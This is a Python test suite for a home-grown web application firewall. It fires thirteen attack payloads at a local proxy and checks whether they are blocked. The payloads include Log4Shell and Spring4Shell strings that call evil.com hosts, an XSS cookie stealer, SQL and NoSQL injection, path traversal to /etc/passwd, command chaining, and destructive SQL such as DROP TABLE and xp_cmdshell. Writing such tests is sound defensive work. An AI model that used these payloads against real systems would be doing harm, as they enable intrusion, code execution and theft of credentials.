"""
=============================================================================
                  LIGHTNING - ADVANCED PENETRATION & DEFENSE TEST SUITE
                  CREATED BY NEXO-TECH BY ALEXANDER
=============================================================================
"""

import sys
import os
import time
import json
import base64
import urllib.request
import urllib.parse
from banner import Colors, print_banner
from config import load_config
from core.db_monitor import DatabaseSentinel
from core.notifier import SecurityNotifier

ENTERPRISE_ATTACKS = [
    {
        "id": "1",
        "category": "Zero-Day Exploit (Log4Shell)",
        "name": "Log4Shell (CVE-2021-44228) JNDI LDAP Injection",
        "path": "/login",
        "method": "GET",
        "headers": {"X-Api-Version": "${" + "jndi:ldap://evil-attacker.com:1389/Exploit}"}
    },
    {
        "id": "2",
        "category": "Zero-Day Exploit (Spring4Shell)",
        "name": "Spring4Shell (CVE-2022-22965) ClassLoader Injection",
        "path": "/helloworld?class.module.classLoader.URLs[0]=jar:http://evil.com/shell.jar!/",
        "method": "GET",
        "headers": {}
    },
    {
        "id": "3",
        "category": "Zero-Day Exploit (PHP-CGI)",
        "name": "PHP-CGI Argument Injection (CVE-2024-4577)",
        "path": "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
        "method": "GET",
        "headers": {}
    },
    {
        "id": "4",
        "category": "SQL Injection (SQLi)",
        "name": "SQLi - Authentication Bypass & UNION Extraction",
        "path": "/api/users?search=admin'%20UNION%20SELECT%201,password,email%20FROM%20users--",
        "method": "GET",
        "headers": {}
    },
    {
        "id": "5",
        "category": "NoSQL Injection",
        "name": "MongoDB Operator Injection ($gt bypass)",
        "path": "/api/login?user%5B%24gt%5D=&pass%5B%24gt%5D=",
        "method": "GET",
        "headers": {}
    },
    {
        "id": "6",
        "category": "Cross-Site Scripting (XSS)",
        "name": "Stored & Reflected XSS Cookie Stealer",
        "path": "/search?q=%3Cscript%3Edocument.location='http://evil.com/?c='%2Bdocument.cookie%3C/script%3E",
        "method": "GET",
        "headers": {}
    },
    {
        "id": "7",
        "category": "Path Traversal / LFI",
        "name": "Directory Traversal to Sensitive OS Files",
        "path": "/download?file=../../../../etc/passwd",
        "method": "GET",
        "headers": {}
    },
    {
        "id": "8",
        "category": "Remote Code Execution (RCE)",
        "name": "OS Command Chaining & Shell Invocation",
        "path": "/tools/ping?ip=127.0.0.1;%20powershell%20whoami;%20cat%20/etc/passwd",
        "method": "GET",
        "headers": {}
    },
    {
        "id": "9",
        "category": "Malware & Web Shell Upload",
        "name": "Multipart Script Upload Attempt (Double Extension)",
        "path": "/upload",
        "method": "POST",
        "headers": {"Content-Type": "multipart/form-data; boundary=----WebKitBoundaryTest"},
        "body": b'------WebKitBoundaryTest\r\nContent-Disposition: form-data; name="file"; filename="avatar.php.jpg"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo "test"; ?>\r\n------WebKitBoundaryTest--\r\n'
    },
    {
        "id": "10",
        "category": "Honeypot Decoy Trap",
        "name": "Probing Fake Admin Portal (/admin_login.php)",
        "path": "/admin_login.php",
        "method": "GET",
        "headers": {}
    },
    {
        "id": "11",
        "category": "API Auth (JWT Bypass)",
        "name": "JWT Algorithm 'none' Signature Bypass",
        "path": "/api/v1/profile",
        "method": "GET",
        "headers": {
            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoicm9vdCJ9."
        }
    },
    {
        "id": "12",
        "category": "Network & Tor Intelligence",
        "name": "Tor Anonymous Exit Node Interception",
        "path": "/api/transfer",
        "method": "GET",
        "headers": {"X-Tor-Exit-Node": "true"}
    },
    {
        "id": "13",
        "category": "Malicious Scanner Detection",
        "name": "Automated Scanner Interception (SQLMap / Nikto)",
        "path": "/api/items/1",
        "method": "GET",
        "headers": {"User-Agent": "sqlmap/1.4.7#stable (http://sqlmap.org)"}
    }
]


def send_test_request(shield_url: str, attack: dict):
    C = Colors
    url = f"{shield_url.rstrip('/')}{attack['path']}"
    headers = attack.get("headers", {})
    if "User-Agent" not in headers:
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) LIGHTNING-TestClient"

    print(f"\n{C.YELLOW}[*] Testing: [{attack['category']}] {attack['name']}...{C.RESET}")
    print(f"{C.DARK_GRAY}    Target: {url}{C.RESET}")

    req = urllib.request.Request(
        url,
        data=attack.get("body", None),
        headers=headers,
        method=attack.get("method", "GET")
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"{C.GREEN}    [Response: HTTP {resp.status}]{C.RESET}")
    except urllib.error.HTTPError as e:
        if e.code == 403:
            print(f"{C.RED}{C.BOLD}    ✔ [BLOCKED BY LIGHTNING SHIELD] HTTP 403 Forbidden - Exploit Intercepted!{C.RESET}")
        elif e.code == 429:
            print(f"{C.RED}{C.BOLD}    ✔ [RATE LIMITED] HTTP 429 Too Many Requests - Flooding Suppressed!{C.RESET}")
        else:
            print(f"{C.YELLOW}    [HTTP {e.code}] Response received.{C.RESET}")
    except Exception as e:
        print(f"{C.RED}    [Error connecting to Shield]: {e}{C.RESET}")


def run_bola_test(shield_url: str):
    C = Colors
    print(f"\n{C.YELLOW}[*] Testing Broken Object Level Auth (BOLA) Rapid ID Iteration...{C.RESET}")
    for res_id in range(101, 110):
        url = f"{shield_url.rstrip('/')}/api/v1/accounts/{res_id}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 BOLA-Scanner"})
        try:
            with urllib.request.urlopen(req, timeout=3) as resp:
                pass
        except urllib.error.HTTPError as e:
            if e.code == 403:
                print(f"{C.RED}{C.BOLD}    ✔ [BOLA ATTACK DETECTED & BLOCKED] Rapid ID traversal was caught at ID {res_id}!{C.RESET}")
                return
        except Exception:
            pass
        time.sleep(0.08)
    print(f"{C.GREEN}    BOLA test sequence completed.{C.RESET}")


def test_database_rules(notifier: SecurityNotifier):
    C = Colors
    print(f"\n{C.PURPLE}{C.BOLD}[*] Testing Database Security Rule Engine...{C.RESET}")
    db_sentinel = DatabaseSentinel(db_type="mysql", db_name="production_db", notifier=notifier)
    
    test_queries = [
        ("DROP TABLE users;", "Destructive Object Drop Test"),
        ("TRUNCATE TABLE payment_records;", "Destructive Table Truncation Test"),
        ("GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';", "Privilege Escalation Test"),
        ("EXEC master..xp_cmdshell 'whoami';", "OS Command Execution in SQL Test"),
        ("SELECT * FROM sensitive_passwords LIMIT 100000;", "Mass Data Extraction Test"),
    ]
    for q, label in test_queries:
        print(f"{C.DARK_GRAY}    Executing Query: {q}{C.RESET}")
        db_sentinel.inspect_query_string(q, client_ip="192.168.1.188")
        time.sleep(0.2)
    print(f"{C.GREEN}    ✔ All Database Security Rule tests triggered and logged!{C.RESET}\n")


def main():
    C = Colors
    print_banner()
    config = load_config()
    shield_url = f"http://127.0.0.1:{config['shield_proxy_port']}"
    notifier = SecurityNotifier(log_file=config.get("log_file", "lightning_security.log"), sound_enabled=config.get("sound_alerts", True))

    print(f"\n{C.CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{C.RESET}")
    print(f"{C.CYAN}┃     ⚡ LIGHTNING COMPREHENSIVE ATTACK & VERIFICATION SUITE ⚡      ┃{C.RESET}")
    print(f"{C.CYAN}┃                 CREATED BY NEXO-TECH BY ALEXANDER                  ┃{C.RESET}")
    print(f"{C.CYAN}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C.RESET}")
    print(f"{C.CYAN}┃ {C.WHITE}Target Shield: {C.YELLOW}{shield_url:<50}{C.CYAN}┃{C.RESET}")
    print(f"{C.CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{C.RESET}\n")

    print(f"{C.WHITE}Select penetration test mode:{C.RESET}")
    print(f"  {C.GREEN}[1]{C.RESET} Run Full Automated Multi-Vector Suite (All 13 Zero-Day & Exploit Vectors)")
    print(f"  {C.GREEN}[2]{C.RESET} Test Zero-Day Virtual Patches (Log4Shell, Spring4Shell, PHP-CGI)")
    print(f"  {C.GREEN}[3]{C.RESET} Test Web Shell & Malware File Upload Interceptor")
    print(f"  {C.GREEN}[4]{C.RESET} Test SQL Injection & NoSQL Injection Attacks")
    print(f"  {C.GREEN}[5]{C.RESET} Test Cross-Site Scripting (XSS), RCE & Path Traversal")
    print(f"  {C.GREEN}[6]{C.RESET} Test Honeypot Decoy Traps & Auto-Bans (/admin_login.php)")
    print(f"  {C.GREEN}[7]{C.RESET} Test API Authentication & JWT 'alg: none' Exploit")
    print(f"  {C.GREEN}[8]{C.RESET} Test Tor Network & Anonymous Proxy Block")
    print(f"  {C.GREEN}[9]{C.RESET} Test Database Security Rules (DROP, TRUNCATE, xp_cmdshell)")
    print(f"  {C.GREEN}[10]{C.RESET} Send Legitimate Clean HTTP Request")
    print(f"  {C.RED}[0]{C.RESET} Exit Test Suite\n")

    choice = input(f"{C.YELLOW}[?] Select option: {C.RESET}").strip()

    if choice == "1":
        for att in ENTERPRISE_ATTACKS:
            send_test_request(shield_url, att)
            time.sleep(0.4)
        run_bola_test(shield_url)
        test_database_rules(notifier)
    elif choice == "2":
        send_test_request(shield_url, ENTERPRISE_ATTACKS[0])
        send_test_request(shield_url, ENTERPRISE_ATTACKS[1])
        send_test_request(shield_url, ENTERPRISE_ATTACKS[2])
    elif choice == "3":
        send_test_request(shield_url, ENTERPRISE_ATTACKS[8])
    elif choice == "4":
        send_test_request(shield_url, ENTERPRISE_ATTACKS[3])
        send_test_request(shield_url, ENTERPRISE_ATTACKS[4])
    elif choice == "5":
        send_test_request(shield_url, ENTERPRISE_ATTACKS[5])
        send_test_request(shield_url, ENTERPRISE_ATTACKS[6])
        send_test_request(shield_url, ENTERPRISE_ATTACKS[7])
    elif choice == "6":
        send_test_request(shield_url, ENTERPRISE_ATTACKS[9])
    elif choice == "7":
        send_test_request(shield_url, ENTERPRISE_ATTACKS[10])
    elif choice == "8":
        send_test_request(shield_url, ENTERPRISE_ATTACKS[11])
    elif choice == "9":
        test_database_rules(notifier)
    elif choice == "10":
        send_test_request(shield_url, {
            "category": "Legitimate Traffic",
            "name": "Standard Browser Request",
            "path": "/",
            "method": "GET",
            "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        })
    else:
        print("Exiting.")

if __name__ == "__main__":
    main()
